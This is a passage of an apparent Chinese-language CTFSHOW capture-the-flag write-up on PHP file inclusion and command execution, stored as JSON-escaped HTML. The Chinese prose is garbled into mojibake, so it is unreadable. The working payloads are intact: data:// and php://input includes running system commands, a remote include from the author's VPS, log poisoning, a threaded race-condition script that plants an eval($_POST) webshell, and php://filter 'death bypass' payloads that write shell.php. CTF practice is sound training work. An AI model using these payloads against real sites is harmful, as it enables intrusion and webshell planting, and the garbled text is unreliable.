class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e20\u003c/span\u003e\u003cspan class=\"cl\"\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e21\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"k\"\u003eelse\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e22\u003c/span\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nx\"\u003ehighlight_file\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"no\"\u003e__FILE__\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e23\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå¯ä»¥çœ‹åˆ°é€šè¿‡evalå‡½æ•°å¯ä»¥æ‰§è¡Œphpä»£ç æˆ–è€…ç³»ç»Ÿå‘½ä»¤ï¼Œå…¶ä¸­è¿‡æ»¤äº†flagã€‚\u003c/p\u003e","title":"CTFSHOW-å‘½ä»¤æ‰§è¡Œ-Writeup"},{"content":" ä»¥PHPä¸ºä¾‹,å¸¸ç”¨çš„æ–‡ä»¶åŒ…å«å‡½æ•°æœ‰ä»¥ä¸‹å››ç§include(),require(),include_once(),require_once()\nWeb78 phpä¼ªåè®®\n1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 10:52:43 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-16 10:54:20 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;file\u0026#39;])){ 16 $file = $_GET[\u0026#39;file\u0026#39;]; 17 include($file); 18}else{ 19 highlight_file(__FILE__); 20} payload:\n?file=data://text/plain,\u003c?php system(\"cat flag.php\")?\u003e\næŸ¥çœ‹æºä»£ç ï¼Œå¾—åˆ°flag\nweb79 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:10:14 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-16 11:12:38 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;file\u0026#39;])){ 16 $file = $_GET[\u0026#39;file\u0026#39;]; 17 $file = str_replace(\u0026#34;php\u0026#34;, \u0026#34;???\u0026#34;, $file); 18 include($file); 19}else{ 20 highlight_file(__FILE__); 21} è¿™é¢˜ç›¸å¯¹äºä¸Šä¸€é¢˜ä¼šå°†fileä¸­çš„phpæ›¿æ¢ä¸º???\næˆ‘ä»¬å¯ä»¥é€šè¿‡base64è¿›è¡Œç»•è¿‡\n?file=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4= or\n?file=data://text/plain,\u0026lt;?=system(\u0026#39;tac flag*\u0026#39;);?\u0026gt; ?file=data://text/plain,\u0026lt;?Php echo `tac f*`;?\u0026gt; or\nè¿œç¨‹åŠ è½½\nåŠ è½½robots.txtï¼Œå‘ç°å¯ä»¥å›æ˜¾\nåœ¨è‡ªå·±vpsä¸Šåˆ›å»º1.txtï¼Œå†…å®¹å¦‚ä¸‹ \u0026lt;?php system(\u0026quot;tac flag.php\u0026quot;);?\u0026gt;\nèµ·ä¸€ä¸ªhttpæœåŠ¡ï¼ŒåŠ è½½ url/?file=http://x.x.x.x:7001/1.txt\nor\ninputåè®® å¤§å°å†™ç»•è¿‡\npayload:\nPOST /?file=Php://input HTTP/1.1\r\u0026lt;?Php system(\u0026#34;cat flag.php\u0026#34;);?\u0026gt; web80 1\u0026lt;?php 2 3/* 4#Â -*-Â coding:Â utf-8Â -*- 5#Â @Author:Â h1xa 6#Â @Date:Â 2020-09-16Â 11:25:09 7#Â @LastÂ ModifiedÂ by:Â h1xa 8#Â @LastÂ ModifiedÂ time:Â 2020-09-16Â 11:26:29 9#Â @email:Â h1xa@ctfer.com 10#Â @link:Â https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;file\u0026#39;])){ 16Â $fileÂ =Â $_GET[\u0026#39;file\u0026#39;]; 17Â $fileÂ =Â str_replace(\u0026#34;php\u0026#34;,Â \u0026#34;???\u0026#34;,Â $file); 18Â $fileÂ =Â str_replace(\u0026#34;data\u0026#34;,Â \u0026#34;???\u0026#34;,Â $file); 19Â include($file); 20}else{ 21Â highlight_file(__FILE__); 22} æ—¥å¿—åŒ…å«\nå†™å…¥ä¸€å¥è¯æœ¨é©¬\nè¿webshellå·¥å…·æˆ–è€…ç›´æ¥getä¼ å‚\n?file=/var/log/nginx/access.log\u0026amp;2=system(\u0026#39;ls /var/www/html\u0026#39;);phpinfo();\r?file=/var/log/nginx/access.log\u0026amp;2=system(\u0026#39;tac /var/www/html/fl0g.php\u0026#39;);phpinfo(); Or\ninputåè®® å¤§å°å†™ç»•è¿‡\npayload:\nPOST /?file=Php://input HTTP/1.1\r\u0026lt;?Php system(\u0026#34;cat flag.php\u0026#34;);?\u0026gt; web81 1\u0026lt;?php 2 3/* 4#Â -*-Â coding:Â utf-8Â -*- 5#Â @Author:Â h1xa 6#Â @Date:Â 2020-09-16Â 11:25:09 7#Â @LastÂ ModifiedÂ by:Â h1xa 8#Â @LastÂ ModifiedÂ time:Â 2020-09-16Â 15:51:31 9#Â @email:Â h1xa@ctfer.com 10#Â @link:Â https://ctfer.com 11 12*/ 13if(isset($_GET[\u0026#39;file\u0026#39;])){ 14Â $fileÂ =Â $_GET[\u0026#39;file\u0026#39;]; 15Â $fileÂ =Â str_replace(\u0026#34;php\u0026#34;,Â \u0026#34;???\u0026#34;,Â $file); 16Â $fileÂ =Â str_replace(\u0026#34;data\u0026#34;,Â \u0026#34;???\u0026#34;,Â $file); 17Â $fileÂ =Â str_replace(\u0026#34;:\u0026#34;,Â \u0026#34;???\u0026#34;,Â $file); 18Â include($file); 19}else{ 20Â highlight_file(__FILE__); 21} åŒä¸Šweb80\nweb82 æ¡ä»¶ç«äº‰\npoc\n1import requests 2import io 3import threading 4 5url=\u0026#39;http://9a77fcb3-6f3c-4bd6-a247-07bfe6766509.challenge.ctf.show:8080/\u0026#39; 6sessionid=\u0026#39;ctfshow\u0026#39; 7data={ 8\t\u0026#34;1\u0026#34;:\u0026#34;file_put_contents(\u0026#39;/var/www/html/jiuzhen.php\u0026#39;,\u0026#39;\u0026lt;?php eval($_POST[3]);?\u0026gt;\u0026#39;);\u0026#34; 9} 10#è¿™ä¸ªæ˜¯è®¿é—®/tmp/sess_ctfshowæ—¶ï¼Œpostä¼ é€’çš„å†…å®¹ï¼Œæ˜¯åœ¨ç½‘ç«™ç›®å½•ä¸‹å†™å…¥ä¸€å¥è¯æœ¨é©¬ã€‚è¿™æ ·ä¸€æ—¦è®¿é—®æˆåŠŸï¼Œå°±å¯ä»¥èšå‰‘è¿æ¥äº†ã€‚ 11def write(session):#/tmp/sess_ctfshowä¸­å†™å…¥ä¸€å¥è¯æœ¨é©¬ã€‚ 12\tfileBytes = io.BytesIO(b\u0026#39;a\u0026#39;*1024*50) 13\twhile True: 14\tresponse=session.post(url, 15\tdata={ 16\t\u0026#39;PHP_SESSION_UPLOAD_PROGRESS\u0026#39;:\u0026#39;\u0026lt;?php eval($_POST[1]);?\u0026gt;\u0026#39; 17\t}, 18\tcookies={ 19\t\u0026#39;PHPSESSID\u0026#39;:sessionid 20\t}, 21\tfiles={ 22\t\u0026#39;file\u0026#39;:(\u0026#39;ctfshow.jpg\u0026#39;,fileBytes) 23\t} 24\t) 25 26def read(session):#è®¿é—®/tmp/sess_ctfshowï¼Œpostä¼ é€’ä¿¡æ¯ï¼Œåœ¨ç½‘ç«™ç›®å½•ä¸‹å†™å…¥æœ¨é©¬ã€‚ 27\twhile True: 28\tresponse=session.post(url+\u0026#39;?file=/tmp/sess_\u0026#39;+sessionid,data=data, 29\tcookies={ 30\t\u0026#39;PHPSESSID\u0026#39;:sessionid 31\t} 32\t) 33\tresposne2=session.get(url+\u0026#39;jiuzhen.php\u0026#39;);#è®¿é—®æœ¨é©¬æ–‡ä»¶ï¼Œå¦‚æœè®¿é—®åˆ°äº†å°±ä»£è¡¨ç«äº‰æˆåŠŸ 34\tif resposne2.status_code==200:äº† 35\tprint(\u0026#39;++++++done++++++\u0026#39;) 36\telse: 37\tprint(resposne2.status_code) 38 39if __name__ == \u0026#39;__main__\u0026#39;: 40 41\tevnet=threading.Event() 42\t#å†™å…¥å’Œè®¿é—®åˆ†åˆ«è®¾ç½®5ä¸ªçº¿ç¨‹ã€‚ 43\twith requests.session() as session: 44\tfor i in range(5): 45\tthreading.Thread(target=write,args=(session,)).start() 46\tfor i in range(5): 47\tthreading.Thread(target=read,args=(session,)).start() 48 49\tevnet.set() getshell\nç›´æ¥æŸ¥flag\nåˆ©ç”¨æ¡ä»¶\nå­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ çŸ¥é“sessionæ–‡ä»¶å­˜æ”¾è·¯å¾„ï¼Œå¯ä»¥å°è¯•é»˜è®¤è·¯å¾„ å…·æœ‰è¯»å–å’Œå†™å…¥sessionæ–‡ä»¶çš„æƒé™ è¿™ä¸¤ä¸ªè„šæœ¬ç†è®ºä¸Šé€‚ç”¨äºweb82-web86\nweb83 web83çš„å¼€ç¯‡è®¾ç½®äº†session_unset();session_destroy();\nsession_unset()ï¼šé‡Šæ”¾å½“å‰åœ¨å†…å­˜ä¸­å·²ç»åˆ›å»ºçš„æ‰€æœ‰$_SESSIONå˜é‡ï¼Œä½†ä¸åˆ é™¤sessionæ–‡ä»¶ä»¥åŠä¸é‡Šæ”¾å¯¹åº”çš„ã€‚ session_destroy()ï¼šåˆ é™¤å½“å‰ç”¨æˆ·å¯¹åº”çš„sessionæ–‡ä»¶ä»¥åŠé‡Šæ”¾sessionidï¼Œå†…å­˜ä¸­çš„$_SESSIONå˜é‡å†…å®¹ä¾ç„¶ä¿ç•™ã€‚\nå°±æ˜¯é‡Šæ”¾å’Œæ¸…é™¤äº†å‰é¢æ‰€æœ‰sessionå˜é‡å’Œæ–‡ä»¶ï¼Œä½†æ˜¯æˆ‘ä»¬çš„è§£é¢˜æ€è·¯æ˜¯ç«äº‰ä¸Šä¼ é‚£ä¸€ç¬é—´åˆ›å»ºçš„sessionï¼Œæ‰€ä»¥ä¸å½±å“ã€‚\nweb84 åŠ ä¸Šäº†ä¸€ä¸ªsystem(rm -rf /tmp/*);ï¼Œä½†æ˜¯å› ä¸ºæœ¬æ¥session.upload_progress.cleanup = onï¼Œå°±ä¼šæ¸…ç©ºå¯¹åº”sessionæ–‡ä»¶ä¸­çš„å†…å®¹ï¼Œè¿™é‡ŒåŠ ä¸Šåˆ é™¤ï¼Œå¯¹ç«äº‰çš„å½±å“ä¸å¤§ã€‚ï¼ˆä½†æ˜¯å¯èƒ½éœ€è¦å¢åŠ ä¸€äº›çº¿ç¨‹ï¼‰\nweb85 æ·»åŠ äº†ä¸€ä¸ªå†…å®¹è¯†åˆ«ï¼Œå¦‚æœæœ‰\u0026lt;å°±dieï¼Œä¾æ—§å¯ä»¥ç«äº‰ã€‚\nweb86 dirname(FILE)è¡¨ç¤ºå½“å‰æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ã€‚set_include_pathå‡½æ•°,æ˜¯ç”¨æ¥è®¾ç½®includeçš„è·¯å¾„çš„ï¼Œå°±æ˜¯include()å¯ä»¥ä¸æä¾›æ–‡ä»¶çš„å®Œæ•´è·¯å¾„äº†ã€‚ includeæ–‡ä»¶æ—¶,å½“åŒ…å«è·¯å¾„æ—¢ä¸æ˜¯ç›¸å¯¹è·¯å¾„ï¼Œä¹Ÿä¸æ˜¯ç»å¯¹è·¯å¾„æ—¶(å¦‚:include(â€œtest.phpâ€))ï¼Œä¼šå…ˆæŸ¥æ‰¾include_pathæ‰€è®¾ç½®çš„ç›®å½•ã€‚ è„šæœ¬é‡Œç”¨çš„æ˜¯å®Œæ•´è·¯å¾„ï¼Œä¸å½±å“ç«äº‰ã€‚\nweb82-86ï¼šå‚è€ƒhttps://blog.csdn.net/m0_48780534/article/details/125410757\nweb87 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-16 21:57:55 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14if(isset($_GET[\u0026#39;file\u0026#39;])){ 15 $file = $_GET[\u0026#39;file\u0026#39;]; 16 $content = $_POST[\u0026#39;content\u0026#39;]; 17 $file = str_replace(\u0026#34;php\u0026#34;, \u0026#34;???\u0026#34;, $file); 18 $file = str_replace(\u0026#34;data\u0026#34;, \u0026#34;???\u0026#34;, $file); 19 $file = str_replace(\u0026#34;:\u0026#34;, \u0026#34;???\u0026#34;, $file); 20 $file = str_replace(\u0026#34;.\u0026#34;, \u0026#34;???\u0026#34;, $file); 21 file_put_contents(urldecode($file), \u0026#34;\u0026lt;?php die(\u0026#39;å¤§ä½¬åˆ«ç§€äº†\u0026#39;);?\u0026gt;\u0026#34;.$content); 22 23 24}else{ 25 highlight_file(__FILE__); 26} ä½¿ç”¨ file_put_contents å‡½æ•°å°†ç»è¿‡å¤„ç†åçš„å†…å®¹å†™å…¥åˆ°æ–‡ä»¶ä¸­ã€‚å†™å…¥çš„å†…å®¹æ˜¯å…ˆæ‹¼æ¥äº†ä¸€ä¸ª \u0026lt;?php die('å¤§ä½¬åˆ«ç§€äº†');?\u0026gt; å­—ç¬¦ä¸²,ç”¨äºåœ¨åç»­å¦‚æœæœ‰äººç›´æ¥è®¿é—®å†™å…¥åçš„æ–‡ä»¶æ—¶ï¼Œé˜²æ­¢æ–‡ä»¶å†…å®¹è¢«ç›´æ¥æ‰§è¡Œè€Œæ˜¾ç¤ºä¸€äº›æç¤ºä¿¡æ¯ï¼Œç„¶åå†æ‹¼æ¥ä¸Šä» $_POST ä¸­è·å–çš„ $content å˜é‡çš„å€¼ã€‚\nè¿™é“é¢˜éœ€è¦ç”¨åˆ°php://filter\nphp://filterçš„ä½¿ç”¨ åŸæ–‡ï¼šè°ˆä¸€è°ˆphp://filterçš„å¦™ç”¨ | ç¦»åˆ«æ­Œ\nphp://filterä¹‹å‰æœ€å¸¸å‡ºé•œçš„åœ°æ–¹æ˜¯XXEã€‚ç”±äºXXEæ¼æ´çš„ç‰¹æ®Šæ€§ï¼Œæˆ‘ä»¬åœ¨è¯»å–HTMLã€PHPç­‰æ–‡ä»¶æ—¶å¯èƒ½ä¼šæŠ›å‡ºæ­¤ç±»é”™è¯¯parser error : StartTag: invalid element name ã€‚å…¶åŸå› æ˜¯ï¼ŒPHPæ˜¯åŸºäºæ ‡ç­¾çš„è„šæœ¬è¯­è¨€ï¼Œ\u0026lt;?php ... ?\u0026gt;è¿™ä¸ªè¯­æ³•ä¹Ÿä¸XMLç›¸ç¬¦åˆï¼Œæ‰€ä»¥åœ¨è§£æXMLçš„æ—¶å€™ä¼šè¢«è¯¯è®¤ä¸ºæ˜¯XMLï¼Œè€Œå…¶ä¸­å†…å®¹ï¼ˆæ¯”å¦‚ç‰¹æ®Šå­—ç¬¦ï¼‰åˆæœ‰å¯èƒ½å’Œæ ‡å‡†XMLå†²çªï¼Œæ‰€ä»¥å¯¼è‡´äº†å‡ºé”™ã€‚\né‚£ä¹ˆï¼Œä¸ºäº†è¯»å–åŒ…å«æœ‰æ•æ„Ÿä¿¡æ¯çš„PHPç­‰æºæ–‡ä»¶ï¼Œæˆ‘ä»¬å°±è¦å…ˆå°†â€œå¯èƒ½å¼•å‘å†²çªçš„PHPä»£ç â€ç¼–ç ä¸€éï¼Œè¿™é‡Œå°±ä¼šç”¨åˆ°php://filterã€‚\nphp://filteræ˜¯PHPè¯­è¨€ä¸­ç‰¹æœ‰çš„åè®®æµï¼Œä½œç”¨æ˜¯ä½œä¸ºä¸€ä¸ªâ€œä¸­é—´æµâ€æ¥å¤„ç†å…¶ä»–æµã€‚æ¯”å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å¦‚ä¸‹ä¸€è¡Œä»£ç å°†POSTå†…å®¹è½¬æ¢æˆbase64ç¼–ç å¹¶è¾“å‡ºï¼š\nreadfile(\u0026#34;php://filter/read=convert.base64-encode/resource=php://input\u0026#34;); å¦‚ä¸‹ï¼š\næ‰€ä»¥ï¼Œåœ¨XXEä¸­ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å°†PHPç­‰å®¹æ˜“å¼•å‘å†²çªçš„æ–‡ä»¶æµç”¨php://filteråè®®æµå¤„ç†ä¸€éï¼Œè¿™æ ·å°±èƒ½æœ‰æ•ˆè§„é¿ç‰¹æ®Šå­—ç¬¦é€ æˆæ··ä¹±ã€‚\nå¦‚ä¸‹ï¼Œæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯php://filter/read=convert.base64-encode/resource=./xxe.php\nå›å½’æ­£é¢˜\næˆ‘ä»¬å®¡ä¸€ä¸‹è¿™é“é¢˜ç›®çš„ä»£ç \nç›¸æ¯”ä¸Šä¸€é“é¢˜è¿™é¢˜å¢åŠ äº†ä¸€ä¸ªpostå‚æ•°ï¼Œä¸”ä¼šå°†ä¼ å…¥çš„å‚æ•°è¿›è¡Œæ‹¼æ¥åå†™å…¥æ–‡ä»¶\n1 $content = $_POST[\u0026#39;content\u0026#39;]; 2 file_put_contents(urldecode($file), \u0026#34;\u0026lt;?php die(\u0026#39;å¤§ä½¬åˆ«ç§€äº†\u0026#39;);?\u0026gt;\u0026#34;.$content); è¿™é“é¢˜åœ¨$contentå’Œ$fileä¹‹é—´æ‹¼æ¥äº†ä¸€ä¸ª\u003c?php die('å¤§ä½¬åˆ«ç§€äº†');?\u003eï¼Œå¯¼è‡´å³ä½¿æˆ‘ä»¬æˆåŠŸå†™å…¥ä¸€å¥è¯ï¼Œä¹Ÿæ‰§è¡Œä¸äº†\næˆ‘ä»¬å¦‚ä½•ç»•è¿‡è¿™ä¸ªdieå‘¢ï¼Ÿ\nå…¶å®æˆ‘ä»¬å¯ä»¥é€šè¿‡php://filteræµçš„base64-decodeæ–¹æ³•æ¥å»é™¤è¿™ä¸ªdie\nå› ä¸ºphpåœ¨è§£ç base64ç¼–ç çš„æ—¶å€™ä¼šå…ˆå°†ä¸å±äºbase64ä¸­çš„å­—ç¬¦å»é™¤ï¼Œå†è¿›è¡Œè½¬æ¢ï¼Œå¦‚ä¸‹\n1\u0026lt;?php 2$_GET[\u0026#39;txt\u0026#39;] = preg_replace(\u0026#39;|[^a-z0-9A-Z+/]|s\u0026#39;, \u0026#39;\u0026#39;, $_GET[\u0026#39;txt\u0026#39;]); 3base64_decode($_GET[\u0026#39;txt\u0026#39;]); æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ php://filter/write=convert.base64-decode æ¥é¦–å…ˆå¯¹å…¶è§£ç ã€‚åœ¨è§£ç çš„è¿‡ç¨‹ä¸­ï¼Œå­—ç¬¦\u0026lt;ã€?ã€;ã€\u0026gt;ã€ã€(ã€) ã€\u0026lsquo;ç©ºæ ¼ç­‰å­—ç¬¦ä¸ç¬¦åˆbase64ç¼–ç çš„å­—ç¬¦èŒƒå›´å°†è¢«å¿½ç•¥ï¼Œæ‰€ä»¥æœ€ç»ˆè¢«è§£ç çš„å­—ç¬¦ä»…æœ‰â€œphpdieâ€å’Œæˆ‘ä»¬ä¼ å…¥çš„å…¶ä»–å­—ç¬¦ã€‚\nâ€phpdieâ€œä¸€å…±6ä¸ªå­—ç¬¦ï¼Œç”±äºbase64ç®—æ³•è§£ç æ—¶æ˜¯4ä¸ªbyteä¸€ç»„ï¼Œæ‰€ä»¥ç»™ä»–å¢åŠ 2ä¸ªâ€œaâ€ä¸€å…±8ä¸ªå­—ç¬¦ã€‚è¿™æ ·ï¼Œ\u0026ldquo;phpdie\u0026quot;è¢«æ­£å¸¸è§£ç ï¼Œè€Œåé¢æˆ‘ä»¬ä¼ å…¥çš„webshellçš„base64å†…å®¹ä¹Ÿè¢«æ­£å¸¸è§£ç ã€‚\nåŒæ—¶ç”±äºä¼šå¯¹ä¼ å…¥çš„fileè¿›è¡Œurlè§£ç ï¼Œæ‰€ä»¥éœ€è¦å¯¹ä¼ å…¥çš„fileè¿›è¡Œä¸¤æ¬¡urlç¼–ç \nwarning!!!urlç¼–ç éœ€è¦è¿åŒè‹±æ–‡å­—ç¬¦ä¸€èµ·è¿›è¡Œè½¬æ¢ï¼Œå¯ä»¥å€ŸåŠ©hackbarå¼ºåˆ¶è¿›è¡Œè½¬æ¢ï¼ˆæ‰¾äº†å¾ˆä¹…ï¼‰\npoc:\nåŸæ–‡ï¼šfile=php://filter/write=convert.base64-decode/resource=shell.php\rfile=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%37%30%25%36%38%25%37%30 åŸæ–‡ï¼šcontent=\u0026lt;?php system(\u0026#39;cat fl0g.php\u0026#39;);?\u0026gt;\rcontent=aaPD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTs/Pg== è®¿é—®shell.php,å¾—åˆ°flag\nå…¶å®è¿˜å¯ä»¥é€šè¿‡å…¶ä»–ç¼–ç æ¥è¿›è¡Œç»•è¿‡å¦‚rot13\næ›´å¤šfile_put_contentå’Œæ­»äº¡Â·æ‚ç³…ä»£ç ä¹‹ç¼˜ - å…ˆçŸ¥ç¤¾åŒº\nweb88 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-17 02:27:25 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12 */ 13if(isset($_GET[\u0026#39;file\u0026#39;])){ 14 $file = $_GET[\u0026#39;file\u0026#39;]; 15 if(preg_match(\u0026#34;/php|\\~|\\!|\\@|\\#|\\\\$|\\%|\\^|\\\u0026amp;|\\*|\\(|\\)|\\-|\\_|\\+|\\=|\\./i\u0026#34;, $file)){ 16 die(\u0026#34;error\u0026#34;); 17 } 18 include($file); 19}else{ 20 highlight_file(__FILE__); 21} è¿™é¢˜è¿‡æ»¤äº†å¾ˆå¤šå­—ç¬¦ä½†æ˜¯æ²¡æœ‰è¿‡æ»¤:ã€/ã€;\npoc\n?file=data://text/plain;base64,PD89c3lzdGVtKCJ0YWMgZmwwZy5waHAiKTsgPz4 web116 æ‹¿åˆ°é¢˜ç›®ç¯å¢ƒï¼Œå‘ç°æ˜¯ä¸ªè§†é¢‘ï¼Œä¸‹è½½è§†é¢‘ç”¨binwalkæ‰«ä¸€ä¸‹\næå–å›¾ç‰‡ï¼Œå‘ç°æ˜¯æºç \nç›´æ¥getä¼ å‚è¯»flag\n?file=flag.php web117 web87çš„åç»­ æ­»äº¡ç»•è¿‡\n1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: yu22x 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-01 18:16:59 9 10*/ 11highlight_file(__FILE__); 12error_reporting(0); 13function filter($x){ 14 if(preg_match(\u0026#39;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i\u0026#39;,$x)){ 15 die(\u0026#39;too young too simple sometimes naive!\u0026#39;); 16 } 17} 18$file=$_GET[\u0026#39;file\u0026#39;]; 19$contents=$_POST[\u0026#39;contents\u0026#39;]; 20filter($file); 21file_put_contents($file, \u0026#34;\u0026lt;?php die();?\u0026gt;\u0026#34;.$contents); è¿™é¢˜è¿‡æ»¤äº†ä¸€äº›phpçš„åè®®å’Œè½¬æ¢å™¨\nä½†æ˜¯æ²¡è¿‡æ»¤æ‰filterå’Œconvert\næˆ‘ä»¬å¯ä»¥è€ƒè™‘ç”¨filteræ­é…convert.iconv.*è¿‡æ»¤å™¨æ¥æ„é€ å‡ºpayload\nå‚è€ƒæ–‡ç« ï¼šè¯¦è§£php://filterä»¥åŠæ­»äº¡ç»•è¿‡_filterç»•è¿‡è¿‡æ»¤-CSDNåšå®¢\n1\u0026lt;?php 2 ?\u0026gt;\u0026#39;); 3echo $enc; 4?\u0026gt; é¦–å…ˆæˆ‘ä»¬å…ˆå°†ä¸€å¥è¯æœ¨é©¬ä»UCS-2BEè½¬æ¢æˆUCS-2LE\n?\u0026lt;hp pe@av(l_$EG[T]1;)\u0026gt;? æ¥ç€æ„é€ payloadå°†ä¸€å¥è¯æœ¨é©¬ä»UCS-2LEè½¬æ¢å›UCS-2BEï¼ŒåŒæ—¶ç ´åæ‰\u003c?php die();?\u003e\næ•ˆæœå¦‚ä¸‹\npayload:\nfile=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php\rcontents=?\u0026lt;hp pe@av(l_$EG[T]1;)\u0026gt;? æˆåŠŸå†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œæ‹¿åˆ°flag\nphpç‰¹æ€§ å‚è€ƒç½‘ç«™ï¼š\nphpä¸€äº›ç‰¹æ€§å‡½æ•°ï¼ˆctfshowï¼‰\nweb89 1\u0026lt;?php 2 3/* 4\\# -*- coding: utf-8 -*- 5\\# @Author: h1xa 6\\# @Date: 2020-09-16 11:25:09 7\\# @Last Modified by: h1xa 8\\# @Last Modified time: 2020-09-18 15:38:51 9\\# @email: h1xa@ctfer.com 10\\# @link: https://ctfer.com 11 12*/ 13 14 15include(\u0026#34;flag.php\u0026#34;); 16highlight_file(__FILE__); 17 18if(isset($_GET[\u0026#39;num\u0026#39;])){ 19 $num = $_GET[\u0026#39;num\u0026#39;]; 20 if(preg_match(\u0026#34;/[0-9]/\u0026#34;, $num)){ 21 die(\u0026#34;no no no!\u0026#34;); 22 } 23 if(intval($num)){ 24 echo $flag; 25 } 26} è¿™é¢˜è¦ç”¨åˆ°æ•°ç»„ç»•è¿‡çš„ç‰¹æ€§æ¥ç»•è¿‡preg_matchçš„åŒ¹é…\npreg_matchå‡½æ•°ï¼š preg_matchå‡½æ•°æ˜¯ç”¨äºå®Œæˆå­—ç¬¦ä¸²çš„æ­£åˆ™åŒ¹é…çš„å‡½æ•°ï¼Œå¦‚æœæ‰¾åˆ°ä¸€ä¸ªåŒ¹é…çš„ï¼Œå°±è¿”å›1ï¼Œå¦åˆ™å°±è¿”å›0ã€‚ preg_matchåªèƒ½å¤„ç†å­—ç¬¦ä¸²ï¼Œå¦‚æœä¼ å…¥çš„å€¼æ˜¯æ•°ç»„çš„è¯ï¼Œå°±ä¼šæŠ¥é”™ï¼Œä»è€Œè¿”å›falseï¼Œç»•è¿‡äº†æ­£åˆ™åŒ¹é…ã€‚\nintvalå‡½æ•°: å®šä¹‰:intval()å‡½æ•°æ˜¯ PHP ä¸­çš„ä¸€ä¸ªå†…ç½®å‡½æ•°ã€‚å®ƒç”¨äºè·å–å˜é‡çš„æ•´æ•°å€¼ã€‚å…¶åŸºæœ¬è¯­æ³•æ˜¯intval($var, $base = 10)ã€‚å…¶ä¸­$varæ˜¯è¦è½¬æ¢çš„å˜é‡ï¼Œ$baseæ˜¯å¯é€‰å‚æ•°ï¼Œç”¨äºæŒ‡å®šè¿›åˆ¶ï¼ˆå½“$var`æ˜¯å­—ç¬¦ä¸²æ—¶ï¼‰ï¼Œé»˜è®¤æ˜¯åè¿›åˆ¶ã€‚\nç‰¹æ€§ï¼š\n1.å¦‚æœå˜é‡æœ¬èº«æ˜¯æ•´æ•°ï¼Œintval()å‡½æ•°ä¼šè¿”å›å˜é‡æœ¬èº«çš„å€¼ã€‚\n2.å½“å˜é‡æ˜¯å­—ç¬¦ä¸²æ—¶ï¼Œintval()ä¼šå°è¯•å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•´æ•°ã€‚å®ƒä¼šä»å­—ç¬¦ä¸²çš„å¼€å¤´æå–æ•°å­—éƒ¨åˆ†ï¼Œç›´åˆ°é‡åˆ°éæ•°å­—å­—ç¬¦ä¸ºæ­¢ã€‚\n3.å¦‚æœå­—ç¬¦ä¸²ä»¥éæ•°å­—å­—ç¬¦å¼€å¤´ï¼Œintval()ä¼šè¿”å› 